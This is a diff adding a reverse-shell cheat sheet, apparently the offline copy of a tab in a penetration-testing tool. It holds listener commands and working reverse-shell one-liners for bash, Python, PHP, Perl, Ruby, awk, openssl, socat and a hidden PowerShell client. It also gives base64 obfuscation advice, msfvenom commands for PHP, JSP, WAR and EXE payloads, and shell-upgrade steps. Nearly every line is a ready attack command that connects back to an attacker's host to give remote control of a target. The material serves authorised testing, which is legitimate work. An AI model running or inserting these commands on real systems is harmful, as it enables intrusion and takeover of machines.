@@ -1,0 +1,47 @@
+# Reverse shells — full catalog. Replace IP / PORT. Start the matching listener first.
+# (The Reverse Shells tab has these pre-filled from your Scope panel; this is the offline copy.)
+
+## Listeners
+nc -lvnp PORT
+rlwrap -cAr nc -lvnp PORT                 # readline: arrows/history in the shell
+ncat --ssl -lvnp PORT                     # TLS, pairs with openssl/ncat-ssl shells below
+socat file:`tty`,raw,echo=0 TCP-L:PORT    # fully interactive TTY
+pwncat-cs -lp PORT                        # auto TTY upgrade + extras
+openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj '/CN=x' && openssl s_server -quiet -key k.pem -cert c.pem -port PORT
+
+## Linux
+bash -i >& /dev/tcp/IP/PORT 0>&1
+0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
+nc IP PORT -e /bin/bash
+ncat IP PORT -e /bin/bash
+ncat --ssl IP PORT -e /bin/bash
+busybox nc IP PORT -e /bin/sh
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
+php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+awk 'BEGIN{s="/inet/tcp/0/IP/PORT";while(1){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}' /dev/null
+# TLS (pairs with ncat --ssl / openssl s_server):
+mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect IP:PORT >/tmp/s;rm /tmp/s
+# socat fully-interactive:
+socat TCP:IP:PORT EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane
+
+## Windows (PowerShell)
+powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
+# base64 one (avoids quoting hell): build then run `powershell -nop -w hidden -e <B64>`
+#   $c='<the oneliner above>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
+
+## msfvenom-generated (allowed generator; catch with nc/ncat, not multi/handler if you prefer)
+msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
+
+## TTY upgrade (after you land a dumb shell)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl-Z ; stty raw -echo; fg ; (enter) ; export TERM=xterm; stty rows 50 columns 200
+script -qc /bin/bash /dev/null           # alternative upgrade
+```
+Set listener rows/cols with `stty -a` in your own terminal first.
+```
